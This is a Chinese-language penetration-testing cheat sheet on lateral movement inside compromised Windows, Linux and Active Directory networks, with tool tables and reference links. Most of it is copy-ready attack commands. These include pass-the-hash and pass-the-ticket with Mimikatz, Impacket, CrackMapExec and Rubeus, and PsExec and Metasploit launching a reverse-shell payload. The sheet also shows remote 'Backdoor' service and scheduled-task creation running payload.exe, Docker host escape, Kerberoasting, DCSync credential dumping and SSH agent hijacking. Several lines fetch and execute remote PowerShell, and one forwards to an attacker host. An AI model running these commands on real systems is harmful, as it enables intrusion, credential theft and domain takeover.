---
id: 06-003
title: "🔄 横向移动 (Lateral Movement)"
category: 横向移动
category_en: "Lateral Movement"
difficulty: ★★★
tools: "BloodHound, CrackMapExec, Impacket"
last_updated: 2025-07
tags: ["lateral-movement", "pivoting", "tunneling", "remote-execution"]
subdomain: lateral-movement
nist_csf: ["DE.CM-04", "PR.AC-05"]
mitre_attack: ["T1021", "T1570", "T1080", "T1550"]
---
# 🔄 横向移动 (Lateral Movement)

## 概述
在已攻破的网络中，从一台主机移动到另一台主机，扩大控制范围，最终到达目标系统（如域控制器）。

## 核心技能

### 1. Pass-the-Hash (PTH)

```bash
# Windows PTH
# 使用Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:NTLM_HASH /run:powershell.exe"

# 使用impacket
impacket-smbexec DOMAIN/Administrator@10.0.0.1 -hashes :NTLM_HASH
impacket-wmiexec DOMAIN/Administrator@10.0.0.1 -hashes :NTLM_HASH
impacket-psexec DOMAIN/Administrator@10.0.0.1 -hashes :NTLM_HASH
impacket-mimikatz DOMAIN/Administrator@10.0.0.1 -hashes :NTLM_HASH

# CrackMapExec (CME)
crackmapexec smb 10.0.0.1 -u Administrator -H NTLM_HASH -x whoami
crackmapexec wmi 10.0.0.0/24 -u Administrator -H NTLM_HASH -x whoami
crackmapexec winrm 10.0.0.1 -u Administrator -H NTLM_HASH -x whoami

# 使用Invoke-TheHash
powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1'); Invoke-WMIExec -Target 10.0.0.1 -Username Administrator -Hash NTLM_HASH"
```

### 2. Pass-the-Ticket (PTT)

```bash
# 提取Kerberos票据
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"
# 找到导出的.kirbi文件

# 注入票据
mimikatz.exe "kerberos::ptt C:\path\to\ticket.kirbi"
klist  # 验证票据已加载

# 使用Rubeus
Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
Rubeus.exe asktgs /service:CIFS/SERVER.DOMAIN /ticket:base64_ticket /ptt
Rubeus.exe s4u /user:user /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/SERVER.DOMAIN /ptt

# 使用impacket获取服务票据
impacket-getTGT DOMAIN/Administrator:NTLM_HASH -dc-ip 10.0.0.1
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec SERVER.DOMAIN -k -no-pass
```

### 3. PsExec远程执行

```bash
# Windows Sysinternals PsExec
psexec.exe \\10.0.0.1 -u DOMAIN\Administrator -p Password cmd.exe
psexec.exe \\10.0.0.1 -u DOMAIN\Administrator -p Password -s cmd.exe  # SYSTEM权限
psexec.exe \\10.0.0.1 -u DOMAIN\Administrator -p Password -d -c payload.exe
psexec.exe @targets.txt -u DOMAIN\Administrator -p Password -h cmd.exe

# 使用impacket
impacket-psexec DOMAIN/Administrator:Password@10.0.0.1
impacket-psexec DOMAIN/Administrator@10.0.0.1 -hashes :NTLM_HASH

# 使用Metasploit PsExec模块
use exploit/windows/smb/psexec
set RHOSTS 10.0.0.1
set SMBUser Administrator
set SMBPass NTLM_HASH
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

### 4. WMI & WinRM远程执行

```powershell
# WMI远程执行
# 使用wmic
wmic /node:10.0.0.1 /user:DOMAIN\Administrator /password:Password process call create "cmd.exe /c whoami > C:\temp\out.txt"

# 使用PowerShell WMI
$Computer = "10.0.0.1"
$Cred = Get-Credential
Invoke-WmiMethod -ComputerName $Computer -Credential $Cred -Path win32_process -Name create -ArgumentList "powershell.exe -Enc command"

# 使用Invoke-WMIExec
Invoke-WMIExec -Target 10.0.0.1 -Username Administrator -Hash NTLM_HASH -Command "whoami"

# WinRM远程执行
# 启用WinRM（客户端）
winrm quickconfig
winrm set winrm/config/Client @{TrustedHosts="10.0.0.1"}

# 使用winrs
winrs -r:http://10.0.0.1:5985 -u:DOMAIN\Administrator -p:Password whoami

# 使用PowerShell WinRM
Enter-PSSession -ComputerName 10.0.0.1 -Credential $Cred
Invoke-Command -ComputerName 10.0.0.1 -ScriptBlock { whoami } -Credential $Cred

# 使用evil-winrm（Linux）
evil-winrm -i 10.0.0.1 -u Administrator -p Password
evil-winrm -i 10.0.0.1 -u Administrator -H NTLM_HASH
```

### 5. SSH横向移动

```bash
# SSH密钥使用
ssh -i id_rsa user@10.0.0.1
ssh -i id_rsa -o StrictHostKeyChecking=no user@10.0.0.1

# SSH代理转发劫持
# 查看SSH_AUTH_SOCK环境变量
echo $SSH_AUTH_SOCK
# 使用SSH Agent提取密钥
ssh-add -l
# 提取agent中的密钥
git clone https://github.com/xtr4nge/ssh-agent-hijack.git
./ssh-agent-hijack.sh

# SSH端口转发（动态）
ssh -D 1080 user@10.0.0.1  # SOCKS代理
# 配合proxychains使用

# SSH隧道（本地转发）
ssh -L 3389:10.0.0.2:3389 user@jumpbox.com
# 访问本地3389: rdesktop 127.0.0.1

# SSH隧道（远程转发）
ssh -R 8080:127.0.0.1:80 user@attacker.com
# 攻击者访问自己的8080端口即可访问目标的80端口
```

### 6. 内网服务横向移动

```bash
# SMB共享利用
# 查看共享
net view \\10.0.0.1
smbclient -L //10.0.0.1 -N
smbclient //10.0.0.1/C$ -U DOMAIN/Administrator

# 映射网络驱动器
net use Z: \\10.0.0.1\C$ /user:DOMAIN\Administrator Password
copy payload.exe Z:\Windows\Temp\

# Scheduled Tasks远程
schtasks /create /s 10.0.0.1 /u DOMAIN\Administrator /p Password /tn "UpdateTask" /tr "C:\Windows\Temp\payload.exe" /sc ONCE /st 00:00 /ru SYSTEM
schtasks /run /s 10.0.0.1 /tn "UpdateTask"
schtasks /delete /s 10.0.0.1 /tn "UpdateTask" /f

# 服务远程创建
sc \\10.0.0.1 create Backdoor binpath="cmd.exe /c C:\Windows\Temp\payload.exe"
sc \\10.0.0.1 start Backdoor
sc \\10.0.0.1 delete Backdoor

# Docker远程API
docker -H tcp://10.0.0.1:2375 ps
docker -H tcp://10.0.0.1:2375 run -v /:/host -it alpine chroot /host /bin/bash

# Kubernetes API
kubectl --server=https://10.0.0.1:6443 --token=TOKEN get pods
kubectl --server=https://10.0.0.1:6443 exec -it pod-name -- /bin/bash
```

### 7. Active Directory横向移动

```powershell
# BloodHound数据收集
powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"

# SharpHound
SharpHound.exe -c All --zipfilename bloodhound_data

# 常用AD攻击路径
# 滥用Group Policy
# 滥用ACL权限
# Kerberoasting
# AS-REP Roasting
# 管理员组继承
# GPO链接

# Kerberoasting
# 请求服务票据
powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat HashCat | Select-Object Hash"

# 使用Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
# 离线破解:
hashcat -m 13100 hashes.txt rockyou.txt

# AS-REP Roasting (没有Kerberos预认证的用户)
Rubeus.exe asreproast /outfile:asrep_hashes.txt
# 离线破解:
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# DCSync攻击
mimikatz.exe "lsadump::dcsync /domain:DOMAIN /user:krbtgt"
mimikatz.exe "lsadump::dcsync /domain:DOMAIN /user:Administrator"

# GPP密码提取
# SYSVOL中的Group Policy Preference密码
findstr /S cpassword %LOGONSERVER%\SYSVOL\*.xml
# 使用gpp-decrypt解密
gpp-decrypt "cpassword_base64"
```

## 横向移动技术对比

| 技术 | 端口 | 认证方式 | 需要管理员 | 特点 |
|:---|:---:|:---|:---:|:---|
| PsExec | 445/TCP | NTLM哈希/密码 | ✅ | 快速、有日志 |
| WMI | 135,445/TCP | NTLM哈希/密码 | ✅ | 隐蔽、默认启用 |
| WinRM | 5985,5986 | Kerberos/NTLM | ✅ | PowerShell集成 |
| SMBExec | 445/TCP | NTLM哈希/密码 | ✅ | impacket实现 |
| SSH | 22/TCP | 密钥/密码 | 不一定 | Linux横向 |
| Scheduled Tasks | 445/TCP | NTLM哈希/密码 | ✅ | 灵活性高 |
| DCOM | 135/TCP | NTLM哈希/密码 | ✅ | COM对象利用 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| impacket | 网络协议工具集 | https://github.com/fortra/impacket |
| CrackMapExec | 横向移动自动化 | https://github.com/byt3bl33d3r/CrackMapExec |
| BloodHound | AD关系可视化 | https://github.com/BloodHoundAD/BloodHound |
| Evil-WinRM | WinRM客户端 | https://github.com/Hackplayers/evil-winrm |
| Chisel | 隧道工具 | https://github.com/jpillora/chisel |
| Rubeus | Kerberos工具 | https://github.com/GhostPack/Rubeus |

## 参考资源
- [ADSecurity - Lateral Movement](https://adsecurity.org/?p=2238)
- [HackTricks - Lateral Movement](https://book.hacktricks.xyz/windows-hardening/lateral-movement)
- [PayloadsAllTheThings - Lateral Movement](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Lateral%20Movement)
- [SANS - Lateral Movement Guide](https://www.sans.org/white-papers/36467/)
